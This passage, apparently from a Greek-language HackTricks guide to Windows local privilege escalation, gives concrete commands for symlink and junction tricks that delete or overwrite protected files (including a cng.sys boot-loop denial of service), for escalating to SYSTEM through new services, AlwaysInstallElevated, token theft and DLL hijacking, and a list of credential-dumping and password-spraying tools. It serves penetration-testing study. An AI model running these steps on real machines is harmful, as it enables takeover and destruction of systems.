- Μην διαγράψεις το `file1.txt` απευθείας — αυτό θα απελευθέρωνε το oplock πρόωρα.

- Option B: Μετέτρεψε το `folder1` σε ένα **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Επιλογή C: Δημιουργήστε ένα **symlink** στο `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Αυτό στοχεύει το εσωτερικό NTFS stream που αποθηκεύει τα metadata του φακέλου — η διαγραφή του διαγράφει τον φάκελο.

5. Step 5: Release the oplock
- Η διαδικασία SYSTEM συνεχίζει και προσπαθεί να διαγράψει το `file1.txt`.
- Αλλά τώρα, λόγω του junction + symlink, στην πραγματικότητα διαγράφει:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Αποτέλεσμα**: Το `C:\Config.Msi` διαγράφεται από το SYSTEM.

### Από Arbitrary Folder Create σε Permanent DoS

Εκμεταλλεύσου ένα primitive που σου επιτρέπει να **δημιουργείς έναν αυθαίρετο φάκελο ως SYSTEM/admin** — ακόμη κι αν **δεν μπορείς να γράψεις αρχεία** ή **να ορίσεις αδύναμα permissions**.

Δημιούργησε έναν **φάκελο** (όχι αρχείο) με το όνομα ενός **critical Windows driver**, π.χ.:
```
C:\Windows\System32\cng.sys
```
- Αυτή η διαδρομή συνήθως αντιστοιχεί στο `cng.sys` kernel-mode driver.
- Αν το **προ-δημιουργήσεις ως φάκελο**, το Windows αποτυγχάνει να φορτώσει το πραγματικό driver στο boot.
- Έπειτα, το Windows προσπαθεί να φορτώσει το `cng.sys` κατά τη διάρκεια του boot.
- Βλέπει τον φάκελο, **αποτυγχάνει να επιλύσει το πραγματικό driver**, και **κρασάρει ή σταματά το boot**.
- Δεν υπάρχει **fallback**, και **καμία ανάκαμψη** χωρίς εξωτερική παρέμβαση (π.χ. boot repair ή πρόσβαση στο δίσκο).

### Από privileged log/backup paths + OM symlinks σε arbitrary file overwrite / boot DoS

Όταν ένα **privileged service** γράφει logs/exports σε ένα path που διαβάζεται από ένα **writable config**, ανακατεύθυνε αυτό το path με **Object Manager symlinks + NTFS mount points** για να μετατρέψεις το privileged write σε arbitrary overwrite (ακόμα και **χωρίς** SeCreateSymbolicLinkPrivilege).

**Απαιτήσεις**
- Το config που αποθηκεύει το target path είναι writable από τον attacker (π.χ. `%ProgramData%\...\.ini`).
- Δυνατότητα δημιουργίας mount point προς `\RPC Control` και ενός OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Μια privileged operation που γράφει σε αυτό το path (log, export, report).

**Παράδειγμα αλυσίδας**
1. Διάβασε το config για να ανακτήσεις το privileged log destination, π.χ. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` στο `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Ανακατεύθυνε το path χωρίς admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Περίμενε το privileged component να γράψει το log (π.χ., ο admin ενεργοποιεί "send test SMS"). Η εγγραφή τώρα καταλήγει στο `C:\Windows\System32\cng.sys`.
4. Επιθεώρησε τον overwritten target (hex/PE parser) για να επιβεβαιώσεις τη διαφθορά· το reboot αναγκάζει τα Windows να φορτώσουν το tampered driver path → **boot loop DoS**. Αυτό επίσης γενικεύεται σε οποιοδήποτε protected file ένα privileged service θα ανοίξει για write.

> Το `cng.sys` συνήθως φορτώνεται από `C:\Windows\System32\drivers\cng.sys`, αλλά αν υπάρχει ένα copy στο `C:\Windows\System32\cng.sys` μπορεί να επιχειρηθεί πρώτο, κάνοντάς το ένα αξιόπιστο DoS sink για corrupt data.



## **Από High Integrity σε System**

### **Νέα service**

Αν ήδη τρέχεις σε ένα High Integrity process, η **path to SYSTEM** μπορεί να είναι εύκολη απλώς με το **δημιουργία και εκτέλεση ενός νέου service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Όταν δημιουργείτε ένα service binary, βεβαιωθείτε ότι είναι έγκυρο service ή ότι το binary εκτελεί τις απαραίτητες ενέργειες αρκετά γρήγορα, γιατί θα τερματιστεί σε 20s αν δεν είναι έγκυρο service.

### AlwaysInstallElevated

Από ένα High Integrity process θα μπορούσατε να προσπαθήσετε να **ενεργοποιήσετε τις AlwaysInstallElevated registry entries** και να **εγκαταστήσετε** ένα reverse shell χρησιμοποιώντας ένα _**.msi**_ wrapper.\
[Περισσότερες πληροφορίες για τα registry keys που εμπλέκονται και για το πώς να εγκαταστήσετε ένα _.msi_ package εδώ.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Μπορείτε** [**να βρείτε τον κώδικα εδώ**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Αν έχετε αυτά τα token privileges (πιθανότατα θα τα βρείτε σε ένα ήδη High Integrity process), θα μπορείτε να **ανοίξετε σχεδόν οποιοδήποτε process** (όχι protected processes) με το SeDebug privilege, να **αντιγράψετε το token** του process και να δημιουργήσετε ένα **αυθαίρετο process με εκείνο το token**.\
Με αυτή την τεχνική συνήθως **επιλέγεται οποιοδήποτε process που τρέχει ως SYSTEM με όλα τα token privileges** (_ναι, μπορείτε να βρείτε SYSTEM processes χωρίς όλα τα token privileges_).\
**Μπορείτε να βρείτε ένα** [**παράδειγμα κώδικα που εκτελεί την προτεινόμενη τεχνική εδώ**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Αυτή η τεχνική χρησιμοποιείται από το meterpreter για escalation στο `getsystem`. Η τεχνική συνίσταται στο να **δημιουργηθεί ένα pipe και μετά να δημιουργηθεί/καταχραστεί ένα service ώστε να γράψει σε εκείνο το pipe**. Έπειτα, ο **server** που δημιούργησε το pipe χρησιμοποιώντας το **`SeImpersonate`** privilege θα μπορεί να **impersonate το token** του pipe client (του service) αποκτώντας SYSTEM privileges.\
Αν θέλετε να [**μάθετε περισσότερα για τα name pipes θα πρέπει να διαβάσετε αυτό**](#named-pipe-client-impersonation).\
Αν θέλετε να διαβάσετε ένα παράδειγμα του [**πώς να περάσετε από high integrity σε System χρησιμοποιώντας name pipes θα πρέπει να διαβάσετε αυτό**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Αν καταφέρετε να **hijack ένα dll** που **φορτώνεται** από ένα **process** που τρέχει ως **SYSTEM**, θα μπορείτε να εκτελέσετε αυθαίρετο code με εκείνα τα permissions. Επομένως το Dll Hijacking είναι επίσης χρήσιμο για αυτό το είδος privilege escalation και, επιπλέον, είναι πολύ **πιο εύκολο να επιτευχθεί από ένα high integrity process**, καθώς θα έχει **write permissions** στους φακέλους που χρησιμοποιούνται για τη φόρτωση dlls.\
**Μπορείτε** [**να μάθετε περισσότερα για το Dll hijacking εδώ**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Διαβάστε:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS spoofer and man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post (it does not need accesschk to work properly but it can use it).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** andrecommends working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Αναφορές

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

{{#include ../../banners/hacktricks-training.md}}
